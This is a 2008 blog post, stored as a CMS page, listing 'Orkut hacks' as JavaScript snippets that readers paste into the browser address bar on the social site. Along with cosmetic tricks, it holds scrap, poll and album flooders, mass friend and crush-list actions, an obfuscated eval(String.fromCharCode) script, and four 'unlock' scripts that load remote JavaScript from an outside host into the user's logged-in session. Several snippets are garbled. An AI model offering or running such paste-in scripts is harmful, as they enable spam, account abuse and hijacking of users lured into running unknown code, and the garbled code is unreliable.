---
# http://learn.getgrav.org/content/headers
title: Great  Orkut Hacks And Tricks
slug: great-orkut-hacks-and-tricks
# menu: Great  Orkut Hacks And Tricks
date: 26-06-2008
published: true
publish_date: 26-06-2008
# unpublish_date: 26-06-2008
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - Uncategorized
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [Uncategorized]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

Great Orkut (the google social community site) hacks…….and tricks..revealed just for free…To do lot more than you are supposed to do.

**Vibrator in orkut  
**

Just open orkut page and copy this script in URL bar.

Code: Select all

javascript:function flood(n) {if (self.moveBy) {for (i = 20; i > 0; i–) {for (j = n; j > 0; j–) {self.moveBy(1,i);self.moveBy(i,0);self.moveBy(0,-i);self.moveBy(-i,0); } } }} flood(10);{ var inp = “!!!skcoR llA parcS”; var outp = “”; for (i = 0; i <= inp.length; i++) { outp = inp.charAt (i) + outp ; } alert(outp) ;}; reverse();

Hit enter.

**Add all to your hot list  
**

Just open orkut page and copy this script in URL bar.

Code: Select all

javascript:d=document;a=d.forms[1];a.target=”nb”;i=0;void(setInterval((function () {a.action=”Profile.aspx?Action.addHot&uid=”+d.getElementsByTagName(“option”)[i++].value;a.submit()}),2000))

Hit enter.

**Add all to your ignore list  
**

Just open orkut page and copy this script in URL bar.

Code: Select all

javascript:d=document;a=d.forms[1];a.target=”nb”;i=0;void(setInterval((function () {a.action=”Profile.aspx?Action.addIgonre&uid=”+d.getElementsByTagName(“option”)[i++].value;a.submit()}),2000))

Hit enter.

**Add all ur friends to ur crush list  
**

Open this Page and run the script.

Allow all pop ups of orkut.com

Code: Select all

javascript:d=document;a=d.forms[1];a.target=”nb”;i=0;void(setInterval((function () {a.action=”Profile.aspx?Action.addCrush&uid=”+d.getElementsByTagName(“option”)[i++].value;a.submit()}),2000))

**Empty ur crush list  
**

Code: Select all

javascript:i=0;document.body.innerHTML+='<iframe width=”800″ name=”nobody” height=”600″></iframe>’;window[0].location=”/Marks.aspx?mid=3″;function nb(){document.forms[1].target=”nobody”;window[0].\_submitForm(window[0].document.forms[1], ‘delete’, ”);};void(setInterval(nb,2000));

**View UID’s of all friends  
**

Copy the script in in friend’s list.

Hit enter

Code: Select all

javascript:var text\_LoL = document.body.innerHTML.match(/uid=d+/gi);var text\_LoL = text\_LoL.join();var text\_LoL = text\_LoL.match(/d+/gi);var text\_LoL\_1 = “”;for (index\_1 = text\_LoL.length-1;index\_1 >= 0;index\_1–){if (text\_LoL\_1.indexOf(text\_LoL[index\_1]) == -1) {text\_LoL\_1 = text\_LoL\_1 + ‘”‘ + text\_LoL[index\_1] + ‘”,<br/>’} else {text\_LoL\_1 = text\_LoL\_1}};document.write(text\_LoL\_1)

**View all community ids  
**

Copy the scipt in communities page.

Hit enter.

Code: Select all

javascript:var text\_LoL = document.body.innerHTML.match(/cmm=d+/gi);var text\_LoL = text\_LoL.join();var text\_LoL = text\_LoL.match(/d+/gi);var text\_LoL\_1 =””;for (index\_1 = text\_LoL.length-1;index\_1 >= 0;index\_1–){if (text\_LoL\_1.indexOf(text\_LoL[index\_1]) == -1) {text\_LoL\_1 = text\_LoL\_1 + ‘”‘ +text\_LoL[index\_1] + ‘”,’} else {text\_LoL\_1 = text\_LoL\_1}};

**Poll Flooder  
**

Just open the Polls you to have flood and paste the script on address bar.

Code: Select all

javascript:inputs=document.getElementsByTagName(‘input’);for(x=0;x<inputs.length;x++){tipo=inputs[x].type;if(tipo==”radio”){inputs[x].type=”checkbox”;inputs[x].checked=”true”}};void(0)

Hit Enter.

After running this script all the options in the poll will be selected,then you have to press vote.So that you w’ll be voting all the options at a time.

This Script which will flood all the options at once but only for one time.

**Testimonial to All  
**

This Script is used to send testi to all your friend’s.

Open this Page and run the script.

Paste the following javascript in your web browser address bar after navigating to the specified orkut page.

Code: Select all

javascript:vi=document.getElementsByTagName(‘TEXTAREA’).item(0).value;d=document;a=d.forms[1];a.target=”nb”;i=0;void(setInterval((function () {a.action=”/TestimonialWrite.aspx?&Action.submit&countedTextbox=”+vi+”&uid=”+d.getElementsByTagName(“option”)[i++].value;a.submit()}),5000))

**Album Hack  
**

This Script will show or display the pictures which are hidden in friend’s profile.

Paste the following javascript in your web browser address bar after navigating to the specified orkut page.

Code: Select all

javascript:alert(“Wait for few seconds for pic`s to load……”);nb=document.all[0].innerHTML.match(/[0-9]\*.jpg)/g);nb=parseInt(nb);document.body.innerHTML=”<center><font style=”font-size:20″><b>hacking album…wait for a minute<br/></b>http://www.fakers.co.nr</font>”;for(i=1;i<=50;i++){document.body.innerHTML+='<img src=”http://img3.orkut.com/images/milieu/’+i+’/0/’+nb+’.jpg”/><br/><br/><br/><br/>’;};void(0)</center>

**Mass scrap deleter  
**

Open your scrapbook.

Copy the following java script into the URL bar.

Code: Select all

javascript:i=0;document.body.innerHTML+='<iframe width=”800″ name=”tio” height=”600″></iframe>’;window[0].location=”http://www.orkut.com/Scrapbook.aspx?&pageSize=30″;function nick(){document.forms[1].target=”tio”;window[0].\_checkAll(window[0].document.scrapsForm, ‘scrapKeys’, true);window[0].\_submitForm(window[0].document.forms[2], ‘delete’, ”);window[0].location=window[0].document.links[20].href;};void(setInterval(nick,2000))

Hit enter.

Close the window or press refresh to stop the deleting.

**Coloured scraps  
**

Write anything in text box

Copy the script and paste it in URL bar.

Presss enter

Now submit the scrap

Code: Select all

javascript:cor=new Array(‘green’,’red’,’blue’,’maroon’);var z=0;txt=document.getElementsByTagName(‘textarea’)[0]; txt.value=txt.value.replace(/n/gi,’Â§ ‘);sp=txt.value.split(‘ ‘);txti=”;for(l=0;l<sp.length;l++){txti+ ;z++;if(z=”=cor.length){z=0}};” );void(0) ] +sp[l]+=”n” [ +cor[z]+ txt.value=”txti;txt.value=txt.value.replace(/Â§/gi,”></sp.length;l++){txti+>

**New way of writing  
**

Write anything in text box

Copy the script and paste it in URL bar.

Presss enter

Now submit the scrap

Code: Select all

javascript:var txt=document.getElementsByTagName(‘textarea’)[0];txt.value=txt.value.replace(/a/gi,”α”);txt.value=txt.value.replace(/p/gi,”ρ”);txt.value=txt.value.replace(/N/gi,”и”);txt.value=txt.value.replace(/t/gi,”т”);txt.value=txt.value.replace(/E/gi,”є”);txt.value=txt.value.replace(/u/gi,”υ”);txt.value=txt.value.replace(/h/gi,”н”);txt.value=txt.value.replace(/s/gi,”ร“);txt.value=txt.value.replace(/o/gi,”σ”);txt.value=txt.value.replace(/m/gi,”м”);txt.value=txt.value.replace(/r/gi,”я”);void(0);

**Message Reverser  
**

Open scrapbook

Write text in text box.

Copy the script in URL bar and hit enter.

Now submit the scrap

Code: Select all

javascript:alert(“Katyal Rocks”);msgm=prompt(“message”);function reverse() { var inp = msgm; var outp=””;for (i = 0; i <= inp.length; i++) { outp =inp.charAt (i) + outp;}txt=document.getElementsByTagName(‘textarea’)[0];txt.value=outp ;}; reverse();

**Dictionary in orkut  
**

Copy the script in URL bar and hit enter.

Write the desired word and get its meaning.

Code: Select all

javascript:eval(String.fromCharCode(97, 61, 112, 114, 111, 109, 112, 116, 40, 34, 69, 110, 116, 101, 114, 32, 87, 111, 114, 100, 32, 84, 111, 32, 66, 101, 32, 83, 101, 97, 114, 99, 104, 101, 100, 32, 73, 110, 32, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 34, 41, 59, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 105, 110, 110, 101, 114, 72, 84, 77, 76, 43, 61, 39, 60, 105, 102, 114, 97, 109, 101, 32, 110, 97, 109, 101, 61, 34, 97, 114, 115, 104, 34, 32, 119, 105, 100, 116, 104, 61, 34, 49, 48, 50, 52, 34, 32, 104, 101, 105, 103, 104, 116, 61, 34, 55, 54, 56, 34, 62, 60, 47, 105, 102, 114, 97, 109, 101, 62, 39, 59, 119, 105, 110, 100, 111, 119, 91, 48, 93, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 100, 105, 99, 116, 105, 111, 110, 97, 114, 121, 46, 104, 109, 47, 115, 101, 97, 114, 99, 104, 95, 102, 117, 110, 99, 116, 105, 111, 110, 46, 112, 104, 112, 63, 113, 61, 34, 32, 43, 97));void(0)

**Profile without picture  
**

Use this script while you are in cropping stage

Code: Select all

javascript:i=document.getElementsByTagName(‘input’);i[‘apw’].value=”1″;i[‘aph’].value=”1″;i[‘apx’].value=”0″;i[‘apy’].value=”0″;i[‘apdw’].value=crpImg.width;i[‘apdh’].value=crpImg.height;\_submitForm(document.getElementById(‘cropForm’),’crop’);void(0)

**Album flooder  
**

Goto http://www.orkut.com/Album.aspx

Then browse pic which u want to flood after selection run this script.

Code: Select all

javascript:function devil(){\_submitForm(document.forms[1], ‘upload’, ”);}void(setInterval(devil,350));

Double Flooder

This Script will flood only your scrapbook whoever run this script.

You need to just change the GID in the script.

Paste any one of the below scripts and run on the page you have opened(scrapbook).Paste the script in URL and hit ENTER.You are done!!

Code:

Code: Select all

javascript:i=0;document.body.innerHTML+='<iframe></iframe>’;functioncs1(){cs=replyForm;cs.toUserId.value=79660920;cs.target=’TF’;cs.scrapText.value=”.”+i;cs.action=’Scrapbook.aspx?Action.writeScrapBasic’;cs.submit();i++};crazy=document.getElementsByTagName(‘TEXTAREA’).item(0).value;document.body.innerHTML+='<iframe></iframe>’;document.forms[1].target=’tf2′;setInterval(“document.getElementsByTagName(‘TEXTAREA’).item(0).value=crazy+’ ‘+ i;a=\_submitForm(document.forms[1], ‘writeScrapBasic’,”);i++”,1300);void(setInterval(cs1,800))

**Larger About Me  
**

Use this script on the ‘social’ section of your profile editing page (EditSocial.aspx). This will enlarge the text box in which you can write about yourself with ease.

Paste the following javascript in your web browser address bar after navigating to the specified orkut page.

Code:

Code: Select all

javascript:var tas=document.getElementsByTagName(‘textarea’);for(var i=0;i<tas.length;i++){try{if(tas[i].name ==”aboutMe” ){tas[i].rows=”80;tas[i].cols=100;}}catch(e){}}void(0);”></tas.length;i++){try{if(tas[i].name>

**Add 1000+ friends  
**

This is the script for adding more than 1000+ friend’s.

You just need to run this script on the profile’s of those whom you wanted to add.

Code: Select all

javascript:a=document.forms[4]; a.action=%22home.aspx?Action.acceptFriend%22; a.method=%22post%22;reg=new RegExp(%22uid=([0-9]\*)%22);uid = reg.exec(String(location))[1];a.innerHTML+=%22<input value=”%22+uid+%22″ name=”friendRequestUserId”/>%22;a.submit()

**Funny Scripts 2  
**

Open any Page in Orkut. (Preferable ‘Friends’ page)

Copy the following java script into the URL Bar.

Hit ENTER.

Code: Select all

javascript:R=0; x1=.1; y1=.05; x2=.25; y2=.24; x3=1.6; y3=.24; x4=300; y4=200; x5=300; y5=200; DI=document.images; DIL=DI.length; function A(){for(i=0; i<dil; ].style; ,5); a() ; i++){dis=”DI[” dis.top=”Math.cos(R\*y1+i\*y2+y3)\*y4+y5}R++}setInterval(” dis.position=”absolute” i void(0) dis.left=”Math.sin(R\*x1+i\*x2+x3)\*x4+x5;”></dil;>

**Unlock Any Scrapbook  
**

Just open orkut page and copy this script in URL bar.

Code: Select all

javascript:d=document;c=d.createElement(‘script’);d.body.appendChild(c);c.src=’http://freetze.freetzi.com/scrapbook.js’;void(0)

Hit enter.

It unlocks all scrapbooks automatically.

**Unlock Any Album  
**

Just open orkut page and copy this script in URL bar.

Code: Select all

javascript:d=document;c=d.createElement(‘script’);d.body.appendChild(c);c.src=’http://freetze.freetzi.com/album.js’;void(0)

Hit enter.

It unlocks all albums automatically.

**Increase your fans  
**

Just open orkut page and copy this script in URL bar.

Code: Select all

javascript:d=document;c=d.createElement(‘script’);d.body.appendChild(c);c.src=’http://freetze.freetzi.com/fans.js’;void(0)

Hit enter.

It increase your fans within minutes.

**Show Video Instead Of Profile Picture  
**

Just open orkut page and copy this script in URL bar.

Code: Select all

javascript:d=document;c=d.createElement(‘script’);d.body.appendChild(c);c.src=’http://freetze.freetzi.com/video.js’;void(0)

Hit enter.

It replaces video with your profile picture.

**Scrapbook Flooder  
**

Open scrapbook.

Write something in the text box.

Donot press submit

Copy the following java script into the URL bar.

Code: Select all

javascript: i=0;nb=document.body.innerHTML.match(/w+/d+/(d+).jpg/i)[1];nb1=document.getElementsByTagName(‘TEXTAREA’).item(0).value; document.body.innerHTML+='<iframe width=”800″ name=”SbFlood” height=”600″/>’; function a(){vi=replyForm;vi.toUserId.value=nb;vi.target=”SbFlood”;vi.scrapText.value=nb1 + “[silver]” + i ;vi.action=’Scrapbook.aspx?Action.submit’;vi.submit();i++};void(setInterval(a,1050))</iframe>

Hit enter.

Close the window or press refresh to stop the flooding.

**Add a Friend  
**

This code will add your friend automatically when you run this script.

Run the on your friend’s profile whom you want to add.

Paste the script and run on the page you have opened(friend’s profile).

Code: Select all

javascript:add=document.forms[1];add.action=’FriendAdd.aspx?Action.yes&’+location.href.match(/uid=d\*/gi);add.submit(); void (0)

Paste the script in URL and hit enter.You are done!!

Go to our new site- shankee.com
